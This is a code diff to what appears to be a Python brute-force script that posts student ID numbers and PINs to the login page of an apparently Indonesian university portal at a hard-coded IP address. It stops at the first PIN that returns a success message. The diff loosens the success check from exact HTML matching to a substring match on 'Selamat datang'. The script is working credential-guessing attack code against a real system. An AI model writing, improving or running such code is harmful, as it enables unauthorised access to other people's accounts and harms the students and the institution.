@@ -69,7 +69,8 @@ def login(nim, pin, found, counter, depth=0):
     in this function declarataion as needed
     """
     URL = "http://180.250.7.188/load_login.php"
-    OK_TXT = """<script language="JavaScript1.2">document.getElementById('usern').style.backgroundColor='#F3F3F3';document.getElementById('passw').style.backgroundColor='#F3F3F3'</script><div id="divTarget">Success </div><script language="javascript">window.location ='/reg/'</script>"""
+    # OK_TXT = """<script language="JavaScript1.2">document.getElementById('usern').style.backgroundColor='#F3F3F3';document.getElementById('passw').style.backgroundColor='#F3F3F3'</script><div id="divTarget">Success </div><script language="javascript">window.location ='/reg/'</script>"""
+    OK_TXT = "Selamat datang"
     MAX_RETRY = 4   # please edit this if you need more retry
 
     if not found.value:
@@ -77,7 +78,7 @@ def login(nim, pin, found, counter, depth=0):
             with requests.Session() as s:
                 data = {"usern": nim, "passw": pin}
                 r = s.post(URL, data=data).text
-            if r == OK_TXT:
+            if OK_TXT in r:
                 found.value = True
                 return pin
         except (requests.ConnectTimeout, requests.ConnectionError):
